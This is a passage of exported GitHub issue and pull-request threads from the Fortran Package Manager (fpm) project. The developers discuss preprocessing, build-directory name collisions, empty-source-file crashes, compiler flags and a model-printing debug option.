like:\nreal :: aw, daw_dX, daw_dT\n\n$symengine\n\n! Initialize symbols\ncall symbols(X, T, a1, a2, b1, b2, 'X T a1 a2 b1 b2')\n\n! Define symbolic expressions\na = a1 + a2*T\nb = b1 + b2*T\naw = (X/a)**(1/b)/(1 + (X/a)**(1/b)) \n\n! Find symbolic derivatives with respect to X and T\ndaw_dX = sp.diff(aw,X)\ndaw_dT = sp.diff(aw,T)\n\ncall fcode(cse([aw, daw_dX, daw_dT]), ['aw','daw_dX','daw_dT'])\n\n$end symengine\n\nwhich would get compiled and linked with symengine in a first pass, and executed to produce the following Fortran source output:\nblock\n    real :: x0, x1, x2, x3, x4, x5, x6, x7\n    x0 = T*a2 + a1\n    x1 = 1d0/x0\n    x2 = X*x1\n    x3 = T*b2 + b1\n    x4 = 1d0/x3\n    x5 = x2**x4\n    x6 = x5 + 1\n    x7 = x5/x6**2\n    aw = x5/x6\n    daw_dX = x4*x7/X\n    daw_dT = -x1*x7*(a2*x3 + b2*x0*log(x2))/x3**2\nend block\n\nI am worried this development cycle is kind of convoluted, and there are many points of failure. If you make errors in your symbolic manipulation section, how are they communicated back to you? This kind of meta-programming is perhaps suitable in something like a Jupyter notebook, but so far I am not convinced it can work in static text files. Since my Fortran source code only needs to be developed once, what is the benefit versus doing my symbolic manipulation in Python or MATLAB and just copying the output to my Fortran source directly?"
                },
                {
                    "user": "ivan-pi",
                    "date": "2020-12-16 11:18:34+00:00",
                    "text": "The preprocessor thread over at j3-fortran contains multiple interesting views from compiler developers, those involved in the standards committee and also users. The prevailing thought seemed to be that it is best to avoid it."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-16 14:07:00+00:00",
                    "text": "Hi @ivan-pi , I caught wind of some of the discussions around intelligent macros, and fully understand why they aren't a good idea for the standard. It's basically just a step way too far in complexity for compilers to implement (at least right now, and maybe ever). I also think they're a pretty difficult feature for programmers to use. Using a well designed macro wouldn't be that hard, but writing one sure would be.\nMy use case was primarily for the purposes of unit testing, but I could see it being useful for other sorts of code generation.  I wouldn't necessarily expect the code that does the generation to be inline though; more like a simple call to an external program whose outputs get substituted in.\nI was mostly just throwing the idea out the to see what other solutions there might be and get the wheels turning. I don't expect to solve this one any time soon."
                },
                {
                    "user": "certik",
                    "date": "2020-12-17 18:28:52+00:00",
                    "text": "Yes, I asked @everythingfunctional to open an issue for this, as he mentioned this at our last Fortran call.\nIt's a broader issue of: do we want to use fpm as a vehicle to extend Fortran, or to provide default pre-processing (for all compilers, for example using fypp), etc.\nAnd for now I recommend to stick to standard Fortran. We can still deliver most of our goals with that.\nIn general, I would like to see Fortran being used without pre-processing.\nIf it turns out there is no other way, we can (in the future) make fpm do all kinds of default pre-processing."
                },
                {
                    "user": "interkosmos",
                    "date": "2021-01-26 20:05:17+00:00",
                    "text": "C preprocessor macros are probably the most common, and they are supported (at least) by GNU Fortran, IFORT, and LLVM. The only problem is that the different implementations do not predefine the same macros. It should therefore be the task if fpm to set common macros (e.g., operating system identifier) if preprocessing/conditional compilation is selected."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2021-01-27 07:48:38+00:00",
                    "text": "Another problem is that the C preprocessor does not conform to Fortran\nsyntax. That limits the kinds of macros that you can reasonably apply. But\nan #if ... #endif construction is probably safe.\n\nOp di 26 jan. 2021 om 21:05 schreef Philipp <notifications@github.com>:\n\u2026\n C preprocessor macros <https://en.wikipedia.org/wiki/C_preprocessor> are\n probably the most common, and they are supported (at least) by GNU Fortran,\n IFORT, and LLVM. The only problem is that the different implementations do\n not predefine the same macros. It should therefore be the task if *fpm*\n to set common macros (e.g., operating system identifier) if\n preprocessing/conditional compilation is selected.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#308 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR3Q6NYUH27YZVAY7CLS34OAZANCNFSM4U47H6UA>\n ."
                }
            ]
        },
        {
            "number": 307,
            "user": "LKedward",
            "date": "2020-12-15 10:07:11+00:00",
            "title": "Fix: program object file collision",
            "text": "Simplifies object naming rules to avoid issue where programs in different top-level folders can have the same object file name\nPlaces example executables in a different build/ subfolder to app executables\nAdd another example program to with_example demo to test for the collision\n\nFixes: #305",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-16 11:39:31+00:00",
                    "text": "So what should I expect with the following?\n\nAh I see that I have only fixed one of the two problems; I'll update to put example executables in a separate 'example' subdirectory as suggested to avoid clashes with executables in 'app'."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-16 13:45:43+00:00",
                    "text": "Okay I think I've addressed both collision issues now: both object files and executables are kept separate between conventional apps and examples.\n(The current release is now quite out-of-date so I've also bumped the patch number for a new release after merging.)"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-17 16:15:32+00:00",
                    "text": "That fixes the issues with the \"default\" directories.  The Haskell version takes that a step further such that even an arbitrary user-specified directory does not have collisions either.  That would take putting everything in it's own subdirectory or hashing the names like h-fpm does, but this looks good;  and I find that when it is a problem I really should be breaking the package in to more subpackages, like \"oldversion\" and \"newversion\"  (creating updated versions while keeping the old version available  in the same package was something I was doing with h-fpm that this complicated with f-fpm). Looks good so far; doing a little bit more testing."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-18 11:27:43+00:00",
                    "text": "Thanks for reviewing both, I'll now merge and prepare a new prelease."
                }
            ]
        },
        {
            "number": 306,
            "user": "urbanjost",
            "date": "2020-12-14 22:20:51+00:00",
            "title": "Add --example to the \"new\" subcommand",
            "text": "After install  is merged  I planned on a quick update of  the new subcommand to create an example/ directory and to add a --example switch.\nI  am proposing that it defaults to making the example/ directory like it does the others  (src/,app/,test/).\nShould be a lot simpler than install and it is likely there will be collisions requiring refactoring and install appears imminent so unless I am underestimating something I was just going to wait a bit but have tried it using the current alpha so it can literally follow on the heels  of install.",
            "comments": []
        },
        {
            "number": 305,
            "user": "urbanjost",
            "date": "2020-12-14 18:37:01+00:00",
            "title": "name collision between  example/main.f90 and app/main.f90",
            "text": "Files built with the test command go into build//test/ and with the run command into  build//app but files built from the example/\ndirectory also go into the app/ directory.  The files are built with their object files named after their original filenames, so if you have\ntest/main.f90 and app/main.f90 .  But if you add example/main.f90\nit gets placed in the same place as the app files, so you cannot build because there is a filename collision.\nThere are a few approaches.  The examples could be build in an example/ subdirectory in build like test  (probably the simplest) or they could be built with their target name  (which in this case is different in the fpm.toml file) or the pathname where they were found could be used to build the file,  or the user can just rename a source file and it can be left as-is.\nOn a related note,  you add the  --example switch to run to  build examples, but have the test command to run tests.  So far test and run have not diverged in functionality.   I would suggest  that we add --test to the run command and then add an example command and change the documentation for test  to say it is just an alias for run --test  and add a new command called example and say it is just an alias for  run --example. As it is there is the inconsistency on how to run test applications versus example applications,  but I strongly prefer using test versus run --test and would prefer a command called example versus run --example.\nI also wonder if there should be an --app switch. The default would be --app if none of the three are specified, perhaps?  That way\nif you wanted you could run all of them with run --app --example --test, although I am not sure that is required(?).  In general I run them one at a time myself. and would be fine with removing the --example switch from run and having a separate command as is now the case with test called example.\nI would expect a fpm.toml file like\n name = \"A\"\nversion = \"0.1.0\"\nlicense = \"license\"\nauthor = \"Jane Doe\"\nmaintainer = \"jane.doe@example.com\"\ncopyright = \"2020 Jane Doe\"\n\n[build]\nauto-executables = false\nauto-tests = false\nauto-examples = false\n\n[library]\nsource-dir=\"src\"\n\n[[test]]\nname=\"runTests\"\nsource-dir=\"test\"\nmain=\"main.f90\"\n\n[[example]]\nname=\"runExample\"\nsource-dir=\"example\"\nmain=\"main.f90\"\n\n[[executable]]\nname=\"A\"\nsource-dir=\"app\"\nmain=\"main.f90\"\n\nto work even without turning off the auto build, as it does now for a test and and app; but it does not. Certainly with no auto builds I thought it would.  Otherwise we need to indicate such collisions must be avoided by the user, which till now we have protected them from.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 18:45:19+00:00",
                    "text": "The same happens with a project using a setup like\nname = \"collision\"\n\n[[executable]]\nname = \"exe1\"\nsource-dir = \"app1\"\nmain = \"main.f90\"\n\n[[executable]]\nname = \"exe2\"\nsource-dir = \"app2\"\nmain = \"main.f90\"\nRunning Fortran fpm we get:\n Error while building target list: duplicate output object \"build/gfortran_debug/app/main.f90.o\"\n  Source file: \"app2/main.f90\"\nSTOP 1"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-14 19:03:16+00:00",
                    "text": "On a related note, you add the --example switch to run to build examples, but have the test command to run tests. So far test and run have not diverged in functionality. I would suggest that we add --test to the run command and then add an example command and change the documentation for test to say it is just an alias for run --test and add a new command called example and say it is just an alias for run --example. As it is there is the inconsistency on how to run test applications versus example applications, but I strongly prefer using test versus run --test and would prefer a command called example versus run --example.\n\nI thought about an example as a special kind of runable target, therefore I grouped it with run --example to the run command.  The equivalent for a testable target might be a benchmark which would nicely fit into the current scheme with test --benchmark."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-14 20:25:47+00:00",
                    "text": "Thanks both for reporting the two collision cases. I think I know where this needs to be fixed, I'll have a go at a fix tomorrow."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-14 21:45:01+00:00",
                    "text": "It seems more consistent to me to have  run  [--test|--benchmark|-example|--app] and have corresponding directories test/, benchmark/, example/, and app/ as special pre-defined directories,  or to have run  app/ example/ where instead of programs being selected a directory could be selected, where if the name contains a separator it is assumed to be a directory.  I would call my examples more \"test\" than \"app\" so I would not look for them under run  I would look under test.  I think allowing directory names as a name would be the most general in that it would allow a user to target a grouping of their own category, and alleviates having to alter the fpm.toml file each time a different  program is selected. And since test is just such a case when nothing is specified in the TOML file it seems relatively natural.  Of course,  I think I could have all the sources in a single directory and explicitly specify everything in the TOML file  as to what is test,  example, and app (but I have not actually tried that).\nIf I was a new user I think run being able to run any executable would be the most intuitive, and names like test, bench, example would be nice additions but mean I only have to read one command description and do not have to look around for how to run a file.\nExcept (probably) for compiler directives I think as much should work as possible without anything but a simple metadata TOML file,\nand that editing the TOML file should only be required for someone building a complex project.  I think Fortran more than any other language is used as a tool by non-programmers  but ironically has less pre-built tools. So I am picturing someone that knows how to\ncompile a program, use a text editor, and knowing maybe a little git or hg or CVS being able to use fpm(1) without having at first learn about CMake, Make, ar,  exotic compiler options, ... . It seems easier to tell someone who wants to run a program to use run; and if they have tests, benchmarks, and examples there is a nice shortcut available.  Got to admit there is a lot personal baggage in deciding that.   I tend to think of what would be the simplest to explain to someone that had never heard of it and go from there though."
                },
                {
                    "user": "arjenmarkus",
                    "date": "2020-12-15 07:08:42+00:00",
                    "text": "Well, this was certainly one reason to write the minibook on building\nprograms in the first place :). And on the various forums (fora?) I see\nenough questions that suggest that the poster is indeed a member of that\ncategory. So let us keep that scenario in mind indeed.\n\nOp ma 14 dec. 2020 om 22:45 schreef urbanjost <notifications@github.com>:\n\u2026\n It seems more consistent to me to have run\n [--test|--benchmark|-example|--app] and have corresponding directories\n test/, benchmark/, example/, and app/ as special pre-defined directories,\n or to have run app/ example/ where instead of programs being selected a\n directory could be selected, where if the name contains a separator it is\n assumed to be a directory. I would call my examples more \"test\" than \"app\"\n so I would not look for them under run I would look undertest. I think\n allowing directory names as a name would be the most general in that it\n would allow a user to target a grouping of their own category, and\n alleviates having to alter the fpm.tomlfile each time a different program\n is selected. And sincetest` is just such a case when nothing is specified\n in the TOML file it seems relatively natural. Of course, I think I could\n have all the sources in a single directory and explicitly specify\n everything in the TOML file as to what is test, example, and app (but I\n have not actually tried that).\n\n If I was a new user I think run being able to run any executable would be\n the most intuitive, and names like test, bench, example would be nice\n additions but mean I only have to read one command description and do not\n have to look around for how to run a file.\n\n Except (probably) for compiler directives I think as much should work as\n possible without anything but a simple metadata TOML file,\n and that editing the TOML file should only be required for someone\n building a complex project. I think Fortran more than any other language is\n used as a tool by non-programmers but ironically has less pre-built tools.\n So I am picturing someone that knows how to\n compile a program, use a text editor, and knowing maybe a little git or hg\n or CVS being able to use fpm(1) without having at first learn about CMake,\n Make, ar, exotic compiler options, ... . It seems easier to tell someone\n who wants to run a program to use run; and if they have tests,\n benchmarks, and examples there is a nice shortcut available. Got to admit\n there is a lot personal baggage in deciding that. I tend to think of what\n would be the simplest to explain to someone that had never heard of it and\n go from there though.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#305 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAN6YR5S72KTYRMWM3XDCN3SU2BO3ANCNFSM4U3FB7HA>\n ."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-15 10:05:13+00:00",
                    "text": "It seems more consistent to me to have run [--test|--benchmark|-example|--app] and have corresponding directories test/, benchmark/, example/, and app/ as special pre-defined directories\n\nThis seems like a good idea to me but while also keeping fpm test as an alias for fpm run --test since having a test command is a common expectation. I prefer this to adding more top-level commands for benchmark and example."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-15 14:04:45+00:00",
                    "text": "It seems more consistent to me to have run [--test|--benchmark|-example|--app] and have corresponding directories test/, benchmark/, example/, and app/ as special pre-defined directories\n\nI think this is very similar to the design that cargo and stack ended up with. I'd have to double check to be sure. So basically:\n\nfpm run implies fpm run --app\nfpm test implies fpm run --test"
                },
                {
                    "user": "urbanjost",
                    "date": "2020-12-15 16:21:25+00:00",
                    "text": "Internally basically test is a special case of run;  unless that is going to change that simplifies documentation and usage.\nThe question is whether anyone wants the commands to diverge. In some other packages test is totally different than run and implies the use of a specific testing framework, in others it is an alias for run with a switch, as proposed and as is (currently) true in fpm.  So currently now you read about the run command and then read about the test command and there is no difference except which list of executables they select, based on the directory the tests are in or the categories they have been placed in (executable or test) in the TOML manifest. If the documentation is largely redundant it seems the command is too, except that those options are so commonly used they deserve an abbreviation.\nSo does anyone intend test to become a completely different beast?  I find it does what I want in its current form."
                }
            ]
        },
        {
            "number": 304,
            "user": "awvwgk",
            "date": "2020-12-12 11:01:33+00:00",
            "title": "Remove note on not supported dependencies in program targets",
            "text": "Related #228\nFixed by #266",
            "comments": []
        },
        {
            "number": 303,
            "user": "LKedward",
            "date": "2020-12-12 10:50:08+00:00",
            "title": "Fixes to source parsing",
            "text": "Fixes #264, issue in source parsing where assignment statements with variables called program or module will be incorrectly detected as program and module declaration statements.\n(Package vegetables now works with fortran fpm.)\n\n\nFixes #301, issue caused by empty source files. Empty source files are detected and not processed any further.\n(Package M_system now works)",
            "comments": []
        },
        {
            "number": 301,
            "user": "urbanjost",
            "date": "2020-12-12 05:06:33+00:00",
            "title": "Getting tracebacks for some fpm builds",
            "text": "With some larger projects with large fpm.toml files I get a blank string passed to a routine that assumes it never gets a blank. It is easy to test for zero length but have not tracked down why it is passing a blank string. Only shows if use the debug version, does not produce erroneous output if not checking for array bounds (ie. use the release version) that I have detected. This one is from M_system.\n$ ffpm build\nAt line 88 of file ././src/fpm_strings.f90\nFortran runtime error: Index '1' of dimension 1 of array 'input' above upper bound of 0\n\nError termination. Backtrace:\n#0  0x7f9e82a4e131 in ???\n#1  0x7f9e82a4ecd9 in ???\n#2  0x7f9e82a4f0bb in ???\n#3  0x44a8be in __fpm_strings_MOD_fnv_1a_string_t\n        at ././src/fpm_strings.f90:88\n#4  0x502805 in __fpm_source_parsing_MOD_parse_f_source\n        at ././src/fpm_source_parsing.f90:89\n#5  0x446229 in parse_source\n        at ././src/fpm_sources.f90:29\n#6  0x43d55a in __fpm_sources_MOD_add_sources_from_dir\n        at ././src/fpm_sources.f90:93\n#7  0x423a6e in __fpm_MOD_build_model\n        at ././src/fpm.f90:91\n#8  0x41d34f in __fpm_MOD_cmd_build\n        at ././src/fpm.f90:191\n#9  0x4019d8 in MAIN__\n        at app/main.f90:25\n#10  0x401ae0 in main\n        at app/main.f90:9",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-12-12 07:40:57+00:00",
                    "text": "Thanks for reporting, I tracked it down to an empty source file in M_time. Removing this file from M_time and updating your dependency tree should resolve the issue.\nThis also raises the question how fpm should deal with this kind of input. An empty source file is usually invalid input for a Fortran compiler, but certainly there should be no runtime error in fpm."
                },
                {
                    "user": "LKedward",
                    "date": "2020-12-12 10:33:29+00:00",
                    "text": "Thanks for reporting @urbanjost. An easy fix is for fpm to ignore such files by not generating any targets for them."
                }
            ]
        },
        {
            "number": 300,
            "user": "urbanjost",
            "date": "2020-12-12 02:37:34+00:00",
            "title": "Remove -coarray=single option from ifort compiler default options",
            "text": "With the intel compiler ifort(1) use of the -coarray=single creates\nan executable with images instead of just allowing the coarray\nsyntax as with the GNU gfortran compiler so it is being removed as\na default option and will be implemented via a more general option\nallowing for user-specified compiler options. As it is, use of the\noption requires developer platforms to support auxiliary libraries\nnot always available, and coarray does not appear to be on all\nplatforms supported by ifort (e.g. MacOS).\n2020-12-11",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-12-12 02:40:20+00:00",
                    "text": "This addresses issues raised in # #283 by removing the -coarray=single switch from the ifort debug and release compiler options.\nJust two lines are deleted."
                }
            ]
        },
        {
            "number": 294,
            "user": "LKedward",
            "date": "2020-12-10 15:53:34+00:00",
            "title": "Add: support for detecting .f and .F files",
            "text": "This PR should allow some legacy projects to compile with some restructuring.\nI've tested this successfully on minpack (mentioned in #107) and @ivan-pi's fortran-lsp (mentioned in #250).\nThis PR adds no internal logic for distinguishing fixed and free-form (#250), this is still left to the compiler.\nResolves: #107\nRelated: #250",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-12-14 17:53:35+00:00",
                    "text": "Thanks for reviewing, I'll merge now."
                }
            ]
        },
        {
            "number": 293,
            "user": "LKedward",
            "date": "2020-12-10 15:35:03+00:00",
            "title": "Fix: missing error check after `new_package` call",
            "text": "Fixes silent failure due to invalid manifest keys when apply_defaults=.true.",
            "comments": []
        },
        {
            "number": 292,
            "user": "certik",
            "date": "2020-12-09 20:42:01+00:00",
            "title": "Specify the correct help for `fpm run -h`",
            "text": "This is just a typo that looks like have been overlooked.",
            "comments": []
        },
        {
            "number": 291,
            "user": "certik",
            "date": "2020-12-09 20:40:24+00:00",
            "title": "Initial implementation of `fpm build --show-model`",
            "text": "It prints a human readable representation of the Model. An example:\n$ fpm build --show-model\n(fpm [(app/main.f90 fpm 3 .false. ...) (test/cli_test/cli_test.f90 cli-test 4 .false. ...) (test/fpm_test/main.f90 fpm-test 4 .false. ...) (test/fpm_test/test_backend.f90 \"\" 4 .false. ...) (test/fpm_test/test_manifest.f90 \"\" 4 .false. ...) (test/fpm_test/test_module_dependencies.f90 \"\" 4 .false. ...) (test/fpm_test/test_source_parsing.f90 \"\" 4 .false. ...) (test/fpm_test/testsuite.f90 \"\" 4 .false. ...) (test/fpm_test/test_toml.f90 \"\" 4 .false. ...) (test/fpm_test/test_versioning.f90 \"\" 4 .false. ...) (test/help_test/help_test.f90 help-test 4 .false. ...) (test/new_test/new_test.f90 new-test 4 .false. ...) (./src/fpm_backend.f90 \"\" 1 .false. ...) (./src/fpm_command_line.f90 \"\" 1 .false. ...) (./src/fpm_compiler.f90 \"\" 1 .false. ...) (./src/fpm_environment.f90 \"\" 1 .false. ...) (./src/fpm.f90 \"\" 1 .false. ...) (./src/fpm_filesystem.f90 \"\" 1 .false. ...) (./src/fpm_model.f90 \"\" 1 .false. ...) (./src/fpm_sources.f90 \"\" 1 .false. ...) (./src/fpm_strings.f90 \"\" 1 .false. ...) (./src/fpm_targets.f90 \"\" 1 .false. ...) (./src/fpm/error.f90 \"\" 1 .false. ...) (./src/fpm/git.f90 \"\" 1 .false. ...) (./src/fpm/manifest.f90 \"\" 1 .false. ...) (./src/fpm/toml.f90 \"\" 1 .false. ...) (./src/fpm/versioning.f90 \"\" 1 .false. ...) (./src/fpm/cmd/new.f90 \"\" 1 .false. ...) (./src/fpm/manifest/build.f90 \"\" 1 .false. ...) (./src/fpm/manifest/dependency.f90 \"\" 1 .false. ...) (./src/fpm/manifest/executable.f90 \"\" 1 .false. ...) (./src/fpm/manifest/library.f90 \"\" 1 .false. ...) (./src/fpm/manifest/package.f90 \"\" 1 .false. ...) (./src/fpm/manifest/test.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/all.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/constants.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/datetime.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/de.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/error.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/ser.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/structure.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/utils.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/version.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/array.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/keyval.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/merge.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/build/table.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/de/character.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/de/tokenizer.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/structure/base.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/structure/vector.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/array.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/keyval.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/table.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/type/value.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/utils/convert.f90 \"\" 1 .false. ...) (build/dependencies/toml-f/src/tomlf/utils/verify.f90 \"\" 1 .false. ...) (build/dependencies/M_CLI2/src/M_CLI2.f90 \"\" 1 .false. ...)] ...)\n\nIt doesn't yet convert all of the model (it prints ... for things it skips), but it gives an idea how it would look like. Let me know if this approach looks good and I should finish printing all of the model in the same way.\nThe motivation for this feature is to be able to more easily learn and debug fpm's internals, and learn how to write a new backend.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-12-09 20:51:59+00:00",
                    "text": "Few questions:\n\nWhat can you do with this?\nIs it for users or developers or both?\nDoes this command also build the code or only prints the model? If the latter, I don't think it should be called fpm build but something else. Maybe without any subcommand, i.e. fpm --show-model?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-12-10 13:53:44+00:00",
                    "text": "Given that users of this functionality are unlikely to be familiar with the types and their components, I would suggest adding that information in as well. It may also be beneficial to \"pretty-print\" the output to make it more readable. For example, I have typically used the following pattern when implementing similar functionality. It makes for (nearly) valid Fortran code. They are also easily composed.\ntype_name_t(\n    component_1 = \"something\",\n    component_2 = 43,\n    component_3 = another_type_t(\n        my_component = 3.14,\n        an_array = [\n            1,\n            3,\n        ]\n    )\n)"
                },
                {
                    "user": "certik",
                    "date": "2020-12-11 16:29:27+00:00",
                    "text": "I can use the format Brad suggested. This does not do any building just showing the comment. It is for developers mainly, but also for users if they want to see what exactly is the \"state\" that fpm sees, and if fpm picked up their files and setup correctly.\nHopefully that answers the question.\nThe only reason I used this syntax is that I converged to it for LFortran, initially I used the syntax that @everythingfunctional suggested. And it quickly turns out into pages and pages of output, which makes it very hard to see anything. However, the actual syntax is relatively easy to change, so if most people prefer the verbose syntax, I will implement it. For me the most important thing is to have this in, so that I can write the cmake backend.\nI have initially created a new command for this. Then I noticed the --list`` in build`, so I just did what was consistent. I can revert it and create a new command again."
                },
                {
                    "user": "certik",
                    "date": "2020-12-22 23:26:44+00:00",
                    "text": "Here is how it looks now:\n:/tmp$ ~/repos/fpm/fpm/build/gfortran_debug/app/fpm new xx1\n + mkdir -p xx1\n + cd xx1\n + mkdir -p xx1/src\n + mkdir -p xx1/test\n + mkdir -p xx1/app\n + git init xx1\nInitialized empty Git repository in /tmp/xx1/.git/\n:/tmp$ cd xx1/\n:/tmp/xx1(master)$ ~/repos/fpm/fpm/build/gfortran_debug/app/fpm build --show-model\n + mkdir -p build/dependencies\n fpm_model_t(package_name=\"xx1\", sources=[srcfile_t(file_name=\"app/main.f90\", exe_name=\"xx1\", unit_scope=3, modules_provided=[], unit_type=1, modules_used=[\"xx1\"], include_dependencies=[], link_libraries=[], digest=5224574535640112330), srcfile_t(file_name=\"test/main.f90\", exe_name=\"runTests\", unit_scope=4, modules_provided=[], unit_type=1, modules_used=[], include_dependencies=[], link_libraries=[], digest=-1967706312983338614), srcfile_t(file_name=\"././src/xx1.f90\", exe_name=\"\", unit_scope=1, modules_provided=[\"xx1\"], unit_type=2, modules_used=[], include_dependencies=[], link_libraries=[], digest=-2717113435056925080)], targets=[build_target_t(output_file=\"build/gfortran_debug/xx1/libxx1.a\", source=(), dependencies=[build_target_t(...)], target_type=2, link_libraries=[], link_objects=[\"build/gfortran_debug/xx1/src_xx1.f90.o\"], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/xx1/app_main.f90.o\", source=srcfile_t(file_name=\"app/main.f90\", exe_name=\"xx1\", unit_scope=3, modules_provided=[], unit_type=1, modules_used=[\"xx1\"], include_dependencies=[], link_libraries=[], digest=5224574535640112330), dependencies=[build_target_t(...)], target_type=3, link_libraries=[], link_objects=[], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/app/xx1\", source=(), dependencies=[build_target_t(...), build_target_t(...)], target_type=1, link_libraries=[], link_objects=[\"build/gfortran_debug/xx1/app_main.f90.o\"], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/xx1/test_main.f90.o\", source=srcfile_t(file_name=\"test/main.f90\", exe_name=\"runTests\", unit_scope=4, modules_provided=[], unit_type=1, modules_used=[], include_dependencies=[], link_libraries=[], digest=-1967706312983338614), dependencies=[], target_type=3, link_libraries=[], link_objects=[], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/test/runTests\", source=(), dependencies=[build_target_t(...), build_target_t(...)], target_type=1, link_libraries=[], link_objects=[\"build/gfortran_debug/xx1/test_main.f90.o\"], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=()), build_target_t(output_file=\"build/gfortran_debug/xx1/src_xx1.f90.o\", source=srcfile_t(file_name=\"././src/xx1.f90\", exe_name=\"\", unit_scope=1, modules_provided=[\"xx1\"], unit_type=2, modules_used=[], include_dependencies=[], link_libraries=[], digest=-2717113435056925080), dependencies=[], target_type=3, link_libraries=[], link_objects=[], touched=.false., sorted=.false., skip=.false., schedule=-1, digest_cached=())], fortran_compiler=\"gfortran\", fortran_compile_flags=\" -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -fcoarray=single  -J build/gfortran_debug/xx1 -I build/gfortran_debug/xx1\", link_flags=\"\", library_file=\"build/gfortran_debug/xx1/libxx1.a\", output_directory=\"build/gfortran_debug\", link_libraries=[], deps=dependency_tree_t(...))\n\nWhile doing this I discovered several problems that I do not want to fix as part of this PR, but rather address in future PRs once this is merged (I'll create separate issues for each of these later):\n\nIn order to introduce a new command fpm show as in 6eef114 runs into a problem as in 1875088 that fpm_show_settings cannot be passed into call build_model(model, settings, package, error) which expects fpm_build_settings and it didn't work even if I subclassed fpm_build_settings with fpm_show_settings. So for now I am just going to implement an fpm build --show-model option, and later we can port it to a standalone command if somebody figures out how to do it.\nbuild_target_t%dependencies(:) points to itself recursively and thus cannot be printed due to infinite recursion. Not sure what is going on, but for now I just print ... in the inner build_target_t and we can investigate and fix this later.\nfpm_model_t%deps is of type dependency_tree_t which is defined outside of the Model. That is not a clean design, rather we need to port it to be fully defined and self sufficient inside the fpm_model.f90 file.\nParts of the build_target_t should probably go to the default backend, not be in the Model, because other backends, such as the cmake backend does not need all of that information, such as the link_objects=[\"build/gfortran_debug/xx1/test_main.f90.o\"], the cmake backend lets cmake figure it out. It only needs to know what the build targets are and what the source dependencies are, so the sources are ok to stay in Model I think.\ntouched=.false. should probably go into the backend also, for example the Make or CMake backend will handle this themselves --- although we need to rescan to see if dependencies changed, in which case the Model would change also.\nSome of the allocatable arrays are not allocated (!). Instead I propose to allocate them to zero length, so that you can loop over it with a simple loop without the need to check for the allocatable status.\nThe srcfile_t are repeated for the same file several times, as they are first part of the package, and then part of the build targets. Is there a way to design this so that things do not repeat? Multiple targets can share a file, so it seems it's a matter of how to best print this, so that things are not repeated all the time.\n\nSo besides these issues the PR now works and all comments should be addressed. I am proposing to merge it as is."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-12-22 23:40:32+00:00",
